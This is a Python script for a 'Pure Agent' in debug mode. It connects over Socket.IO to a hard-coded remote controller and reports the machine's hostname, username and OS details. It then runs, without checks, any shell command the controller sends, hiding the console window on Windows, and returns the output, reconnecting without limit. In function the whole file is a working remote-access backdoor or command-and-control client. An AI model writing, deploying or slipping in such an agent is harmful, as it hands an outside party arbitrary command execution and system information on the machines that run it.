#!/usr/bin/env python3
"""
Pure Agent - DEBUG VERSION
Shows all Socket.IO events to help troubleshoot connection issues
"""

import socketio
import sys
import os
import platform
import subprocess
import threading
import time
import uuid
import psutil

# Configuration
SERVER_URL = "https://agent-controller-backend.onrender.com"
AGENT_ID = str(uuid.uuid4())

print("=" * 70)
print("PURE AGENT - DEBUG MODE")
print("=" * 70)
print(f"Agent ID: {AGENT_ID}")
print(f"Server: {SERVER_URL}")
print("=" * 70)
print("")

# Socket.IO client with verbose logging
sio = socketio.Client(
    reconnection=True,
    reconnection_attempts=0,
    reconnection_delay=5,
    reconnection_delay_max=30,
    logger=True,
    engineio_logger=True
)

def log(message):
    """Simple logging"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] {message}")

def execute_command(command):
    """Execute shell command"""
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        
        output = result.stdout if result.stdout else result.stderr
        return output if output else "Command executed (no output)"
    except Exception as e:
        return f"Error: {str(e)}"

@sio.event
def connect():
    """Connection established"""
    log("🎉 CONNECTED TO CONTROLLER!")
    log(f"Socket ID: {sio.sid}")
    
    # Prepare registration data
    try:
        cpu = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        
        registration_data = {
            'agent_id': AGENT_ID,
            'name': f'Pure-Agent-{platform.node()}',
            'platform': f'{platform.system()} {platform.version()}',
            'ip': 'Auto-detected',
            'capabilities': ['commands', 'system_info'],
            'cpu_usage': cpu,
            'memory_usage': memory.percent,
            'network_usage': 0,
            'system_info': {
                'hostname': platform.node(),
                'os': platform.system(),
                'os_version': platform.version(),
                'architecture': platform.machine(),
                'username': os.getenv('USERNAME') or os.getenv('USER'),
                'python_version': platform.python_version()
            },
            'uptime': time.time() - psutil.boot_time()
        }
        
        log("📤 SENDING agent_connect event...")
        log(f"Data: {registration_data}")
        sio.emit('agent_connect', registration_data)
        log("✅ agent_connect event sent!")
        
        # Also try agent_register
        log("📤 SENDING agent_register event...")
        sio.emit('agent_register', {
            'agent_id': AGENT_ID,
            'platform': f'{platform.system()} {platform.version()}',
            'python_version': platform.python_version(),
            'timestamp': time.time()
        })
        log("✅ agent_register event sent!")
        
    except Exception as e:
        log(f"❌ Error during registration: {e}")

@sio.event
def connect_error(data):
    """Connection error"""
    log(f"❌ CONNECTION ERROR: {data}")

@sio.event
def disconnect():
    """Disconnected"""
    log("⚠️ DISCONNECTED from controller")

# Listen to ALL events for debugging
@sio.on('*')
def catch_all(event, data):
    """Catch all events"""
    log(f"📥 EVENT RECEIVED: '{event}' | Data: {data}")

@sio.on('command')
def on_command(data):
    """Handle command"""
    log(f"📨 COMMAND EVENT: {data}")
    command = data.get('command', '')
    execution_id = data.get('execution_id', '')
    
    log(f"Executing: {command}")
    output = execute_command(command)
    log(f"Output length: {len(output)} chars")
    
    sio.emit('command_result', {
        'agent_id': AGENT_ID,
        'command': command,
        'output': output,
        'success': True,
        'execution_id': execution_id,
        'timestamp': time.time()
    })
    log("✅ Sent command_result")

@sio.on('execute_command')
def on_execute_command(data):
    """Handle execute_command"""
    log(f"📨 EXECUTE_COMMAND EVENT: {data}")
    command = data.get('command', '')
    
    log(f"Executing: {command}")
    output = execute_command(command)
    
    sio.emit('command_result', {
        'agent_id': AGENT_ID,
        'output': output,
        'timestamp': time.time()
    })
    log("✅ Sent command_result")

def heartbeat():
    """Heartbeat loop"""
    while True:
        try:
            time.sleep(30)
            if sio.connected:
                log("💓 Sending heartbeat...")
                
                sio.emit('agent_heartbeat', {
                    'agent_id': AGENT_ID,
                    'timestamp': time.time()
                })
                
                sio.emit('ping', {
                    'agent_id': AGENT_ID,
                    'timestamp': time.time(),
                    'uptime': time.time() - psutil.boot_time()
                })
                
                log("✅ Heartbeat sent")
        except Exception as e:
            log(f"❌ Heartbeat error: {e}")

def main():
    """Main"""
    log("Starting Pure Agent (DEBUG MODE)")
    log("All Socket.IO events will be logged")
    log("")
    
    # Start heartbeat
    threading.Thread(target=heartbeat, daemon=True).start()
    
    # Connect
    while True:
        try:
            log(f"🔌 Connecting to {SERVER_URL}...")
            sio.connect(SERVER_URL, transports=['websocket', 'polling'])
            
            log("✅ Connection established!")
            log("Waiting for commands...")
            log("")
            
            sio.wait()
            
        except KeyboardInterrupt:
            log("\nShutting down...")
            break
        except Exception as e:
            log(f"❌ Error: {e}")
            log("Retrying in 10 seconds...")
            time.sleep(10)
    
    if sio.connected:
        sio.disconnect()
    
    log("Agent stopped")

if __name__ == '__main__':
    main()
